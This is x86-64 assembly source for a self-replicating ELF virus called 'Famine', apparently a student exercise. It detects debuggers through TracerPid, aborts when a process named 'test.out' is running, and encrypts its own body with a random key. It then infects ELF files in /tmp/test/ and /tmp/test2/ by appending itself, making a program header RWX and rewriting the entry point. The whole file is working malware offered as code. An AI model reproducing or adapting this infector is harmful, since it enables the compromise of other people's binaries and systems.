%include "includes/header.s"

SECTION .TEXT EXEC WRITE
global  _start                              ;must be declared for linker (ld)

_start:   ;Entry-Point
PUSH

mov rbp, rsp
sub rbp, famine_size  ; reserve famine_size bytes on the stack

.check_status:		;open the /proc/self/status
xor rdi ,rdi
lea rdi, [rel pfile]
mov rsi, O_RDONLY
mov rax, _open
syscall
cmp rax, 0
jl _exx

lea rsi, STACK(famine.status_str)  ; buf address for read /proc/self/status
mov rdi, rax   ; fd from previous read
mov rdx, 110
mov rax, _read
syscall

lea r12, STACK(famine.status_str)
mov r11, 7
.loop_status:
inc r12
cmp byte[r12], 0x0a
jne .nope
dec r11
cmp r11, 0
je .check_trcr
.nope:
loop .loop_status

.check_trcr:
add r12, 12
cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
jne _exx_pop



.opendir_proc:
	lea rdi, [rel pdir]
	mov rsi, O_RDONLY | O_DIRECTORY
	mov rax, _open
	syscall
	test eax, eax
	jl _exx_pop
	mov r14, rax

.readdir_proc:
	mov rdx, DIRENT_ARR_SIZE
	lea rsi, STACK(famine.dirents_proc)
	mov rdi, r14
	mov rax, _getdents
	syscall
	test rax, rax
	jle .closedir_proc
	mov r13, 0
	mov r12, rax
	call .read_file
	jmp .readdir_proc

.closedir_proc:
	mov rdi, r14
	mov rax, _close
	syscall
	jmp .OUI


.read_file:
	lea rdi, STACK(famine.dirents_proc)
	add rdi, r13
	movzx edx, word[rdi+dirent.d_reclen]
	mov al, byte[rdi + rdx - 1]
	add rdi, dirent.d_name
	add r13, rdx
	cmp al, DT_DIR
	jne .nextfile_proc


lea r11, [rel pdir]
xor rsi, rsi

.dirname_proc:
	mov al, byte[r11]
	mov byte[rel commpath + rsi], al
	inc rsi
	cmp rsi, 6
	inc r11
	jb .dirname_proc

.filename_proc:
	mov al, byte[rdi]
	mov byte[rel commpath + rsi], al
	inc rsi
	inc rdi
	cmp byte[rdi], 0
	jne .filename_proc

lea r11, [rel pname]
mov rdx, 0
.commfile:
	mov al, byte[r11]
	mov byte[rel commpath + rsi], al
	inc r11
	inc rsi
	inc rdx
	cmp rdx, 5
	jne .commfile
	mov byte[rel commpath + rsi], 0


	mov rax, _open
	lea rdi, [rel commpath]
	mov rdx, O_RDWR
	syscall
	test eax, eax
	jl .nextfile_proc

	mov rdi, rax
	mov rax, _read
	lea rsi, [rel thename]
	mov rdx, 90
	syscall
	test eax, eax
	jl .close_proc
	mov byte[rsi + rax - 1], 0x0
	push rdi
	lea rdi, [rel forbidden]
	call .strcmp
	cmp rax, 0
	je _exx_pop
	pop rdi
	.close_proc:
	mov rax, _close
	syscall
	jmp .nextfile_proc


.strcmp:
	mov r10b, BYTE [rdi]
	mov r11b, BYTE [rsi]
	cmp r10b, 0
	je .end_cmp
	cmp r11b, 0
	je .end_cmp
	cmp r10b, r11b
	jne .end_cmp
	inc rdi
	inc rsi
	jmp .strcmp

.end_cmp:
	movzx rax, r10b
	movzx rbx, r11b
	sub rax, rbx
	ret

.nextfile_proc:
	cmp r13, r12
	jl .read_file
	ret


.OUI:

jmp .enc_start
DECYPHER


.enc_start:
;	mov rax, _fork
;	syscall
;	cmp rax, 0
;	jne _exx_pop

.get_rand_key:
	lea rdi, [rel random]
	mov rsi, O_RDONLY
	mov rax, _open
	syscall					; OPEN /dev/random  EXIT if not work
	cmp rax, 0
	jl	_exx_pop
	push rax

	mov rdi, rax		; fd to read
	mov rax, _read
	mov rdx, 1
	lea rsi, STACK(famine.key)
	syscall				; READ 2 byte, 1 for key, 1 for derivate
	
	pop rax
	mov rdi, rax		; fd to read
	mov rax, _read
	mov rdx, 1
	lea rsi, STACK(famine.factor)
	syscall				; READ 2 byte, 1 for key, 1 for derivate
	lea rdi, [rel infect_dir] ; load dir str

.opendir:
	mov r14, rdi
	mov rsi, O_RDONLY | O_DIRECTORY
	mov rax, _open
	syscall				;	open directory
	test eax, eax
	jl .nextdir
	mov STACK(famine.dir_fd), rax		; save dir_fd

.readdir:
	mov rdx, DIRENT_ARR_SIZE
	lea rsi, STACK(famine.dirents)
	mov rdi, STACK(famine.dir_fd)
	mov rax, _getdents
	syscall				;	get directory entries
	test  rax,rax
	jle .closedir		;	no more entries
	mov r13, 0
	mov r12, rax

.file:
	; check directory entry for a regular file
	lea rdi, STACK(famine.dirents)
	add rdi, r13
	movzx edx, word[rdi + dirent.d_reclen]
	mov al, byte[rdi + rdx - 1]
	add rdi, dirent.d_name
	add r13, rdx
	cmp al, DT_REG
	jne .nextfile
	call process		; process the file

.nextfile:
	cmp r13, r12		; check if directory entry looping is over 
	jl .file
	jmp .readdir		; read dir for more entry

.closedir:
	mov rdi, STACK(famine.dir_fd)
	mov rax, _close
	syscall

.nextdir:
	mov ecx, 0
	mul ecx
	dec ecx
	mov rdi, r14
	repnz scasb		; next infect_dir
	cmp byte[rdi], 0
	jnz .opendir
	POP		; restore register 
	jmp _exx.exit		;jump to the end

process:
	mov rsi, r14  ; r14 hold infect dir
	mov rax, rdi
	lea rdi, STACK(famine.file_path)  ; load stack addr to store file_path
	mov rdx, rdi

.dirname:
	movsb			; load dirname to rdi
	cmp byte [rsi], 0
	jnz .dirname
	mov rsi, rax

.filename:
	movsb			; append filename to dirname to get full path
	cmp byte[rsi - 1], 0
	jnz .filename
	mov rdi, rdx
				;open file
	mov rsi, O_RDWR
	mov rax, _open
	syscall			; open


	test eax, eax
	jl .return
	mov STACK(famine.file_fd), rax		; save result from open to stack

				;stat
	lea rsi, STACK(famine.stat)
	mov rdi, rax
	mov rax, _fstat
	syscall
	cmp rax, 0
	jnz .close
	mov rsi, qword STACK(famine.stat + stat.st_size)	; file size from stat to rsi
	mov STACK(famine.file_size), rsi	; save file size to stack 
	cmp rsi, elf64_ehdr_size + elf64_phdr_size + FAMINE_SIZE  ; check if size < ehdr_size + phdr size + famine_size
	jl .close
				;MMAP file
	mov r9, 0
	mov r8, STACK(famine.file_fd)  ; restore file_fd
	mov r10, MAP_SHARED
	mov rdx, PROT_READ | PROT_WRITE
	xor rdi, rdi
	mov rax, _mmap
	syscall

	cmp rax, MMAP_ERRORS
	jae .close
	
	mov STACK(famine.file_data), rax	; save mmap to file from rax to stack
	mov rdi, rax						; 
	call check_elf64
	test al,al
	jz .unmap
	call inject_self

.unmap:
	mov rsi, STACK(famine.file_size)
	mov rdi, STACK(famine.file_data)
	mov rax, _munmap
	syscall

.close:
	mov rdi, STACK(famine.file_fd)
	mov rax, _close
	syscall

.return:
	ret

check_elf64:
	xor rax, rax
	cmp qword[rdi+8], rax
	jnz .return
	mov rdx, _SYSV_			;elf SYSV
	cmp qword [rdi], rdx
	jz .continue
	mov rdx, _GNU_			;ELF_GNU
	cmp qword[rdi], rdx
	jnz .return

.continue:
	mov rdx, _DYN_
	cmp qword[rdi + 16], rdx  ; DYN
	jz .ok
	mov rdx, _EXEC_
	cmp qword[rdi + 16], rdx	; EXEC
	jnz .return
.ok:
	inc rax
.return:
	ret

inject_self:
	push r13		; save registers in case we need to restore 
	push r14
	push r15
	mov r15, rdi ; save phdr[0] offset to r15
	mov rdx, qword [rdi + elf64_ehdr.e_entry]
	movzx rcx, word [rdi + elf64_ehdr.e_phnum]
	mov rax, qword[rdi + elf64_ehdr.e_phoff]
	add rdi,rax
	mov r14, rdi  ; save phdr[0] offset to r14

	.segment:
	cmp rcx, 0
	jl .return
	mov ax, SEGMENT_TYPE
	mov r11w, word [rdi]
	cmp ax, r11w
	jnz .next
	jmp .infect

	.next:
	add rdi, elf64_phdr_size  ; add phdr size to rdi to loop through pheaders
	dec rcx					  ; decrement phnum
	jmp .segment

	.infect:
	push rdi ; save phdr to infect offset to  stack

; get target End of file
	mov rdi, STACK(famine.file_fd) ; target fd to rdi
	mov rsi, 0 ; offset 0
	mov rdx, END_SEEK
	mov rax, _lseek
	syscall
	push rax; save eof from lseek to stack

	; get delta  ( address at execution time)
	call .delta
	.delta:
	pop r13
	sub r13, .delta
	
	; load cypher and write v
	lea rsi, [r13 + _start] ; load _start addr to rsi
	mov rdx, _end - _start  ; virus size to rdx
	lea r10, STACK(famine.tocypher)  ; r10 hold future v-location in stack
	.loading_v:
		mov r11b, byte[rsi]
		mov [r10], r11b
		inc rsi
		inc r10
		dec rdx
		cmp rdx, 0
		jg .loading_v
	
	CYPHER

	mov rdi, STACK(famine.file_fd) ; fd to rdi
	lea rsi, STACK(famine.tocypher)
	mov rdx, _end - _start  ; virus size to rdx
	pop r10 ; rax hold eof from lseek syscall 
	push r10
	mov rax, _pwrite
	syscall

	cmp rax, 0
	jbe .return

	mov rdi, STACK(famine.file_fd) ; fd to rdi
	mov rax, _pwrite			;OVERWRITE THE JUMP OVER DECYPHER METHOD WITH VALUE 0
	lea rsi, [rel signature]
	mov rdx, 1
	add r10, JUMP_DECYPHER_OFFSET ; JUMP OVER DECYPHER VAL OFFSET
	syscall

	pop r10
	push r10
	mov rdi, STACK(famine.file_fd) ; fd to rdi
	mov rax, _pwrite			;OVERWRITE THE VALUE OF KEY IN DECYPHER
	lea rsi, STACK(famine.key)
	mov rdx, 1
	add r10, KEY_OFFSET ;  KEY OFFSET
	syscall

	pop r10
	push r10
	mov rdi, STACK(famine.file_fd) ; fd to rdi
	mov rax, _pwrite			;OVERWRITE THE FACTOR VALUE
	lea rsi, STACK(famine.factor)
	mov rdx, 1
	add r10, FACTOR_OFFSET ; KEY FACTOR OFFSET
	syscall


	.edit_phdr:
	pop rax				;RDI = the offset of patched PHEADER
	pop rdi
	push rdi
	push rax
	mov dword [rdi], 1
	mov eax, PF_R	; READ
	or eax, PF_X	; EXEC
	or eax, PF_W	; WRITE
	mov dword [rdi + 4], eax   ;SET PERMS !
	pop rax				; RAX = The offset of our injected V , (old EOF)
	mov [rdi + 8], rax  ; set phdr.offset  = rax
	mov r13, qword STACK(famine.stat + stat.st_size) ; load target size to r13
	add r13, 0xc000000 ; add vsize to r13
	mov [rdi + 16], r13 ; edit  p_vaddr
	mov [rdi + 24], r14 ; change paddr to new size
	mov qword [rdi + 48], 0x200000  ; set align to 2mb
	add qword [rdi + 32], _end - _start + 5
	add qword [rdi + 40], _end - _start + 5

	;	write it
	mov rdi, STACK(famine.file_fd)
	lea rsi, [rdi]
	mov dx, PHDR_SIZE
	mov r10, r14
	mov rax, _pwrite
	syscall

	.edit_ehdr:
	mov rdi, STACK(famine.file_data)
	mov r14, [rdi + elf64_ehdr.e_entry ] ; save original e_entry to r14
	mov [rdi + elf64_ehdr.e_entry], r13 ; set ehdr.e_entry to vaddr of injected
	
	;write it
	mov rdi, STACK(famine.file_fd)
	mov rsi, r15
	mov rdx, EHDR_SIZE				; 64 is size of EHDR
	mov r10, 0
	mov rax, _pwrite
	syscall

	.jmp_wuw:
	mov rdi , STACK(famine.file_fd)
	mov rsi, 0
	mov rdx, END_SEEK
	mov rax, _lseek
	syscall						; seek to file_end
	
;	compute jump value
	pop rdi ;   restore patched pheader 
	mov rdx, [rdi + elf64_phdr.p_vaddr]
	sub rdx, 9
	sub r14, rdx
	sub r14, _end - _start
	mov byte STACK(famine.jmp), JMP; jmp opcode
	mov dword STACK(famine.jmp + 1), r14d

;write it
	mov rdi, STACK(famine.file_fd)
	lea rsi, STACK(famine.jmp)
	mov rdx, 5
	sub rax, 14  ; offset between _end:  and jump .exit
	mov r10, rax ; EOF From last call to lseek
	mov rax, _pwrite
	syscall

	mov rax, _sync
	syscall
	.return :
		pop r15		; restore saved registers
		pop r14
		pop r13
		ret

infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
random			db			"/dev/random"
enc_end:
	db 0
signature		db			0x00, 'Famine version 99.0 (c)oded by <araout>', 0xa, 0x00
pfile			db			"/proc/self/status",0
pdir			db			"/proc/", 0, 0, 0, 0
pname			db			"/comm"
forbidden		db			"test.out", 0
commpath		times	100		db	0
thename			times	100		db	0
famine_entry	dq			_start

_exx_pop:
POP
_exx:
jmp .exit	; at source execution of famine this will exit. when written to target jump is edited to host entry
	.exit:
		mov rax, _exit
		mov rdi, 0
		syscall

_end:
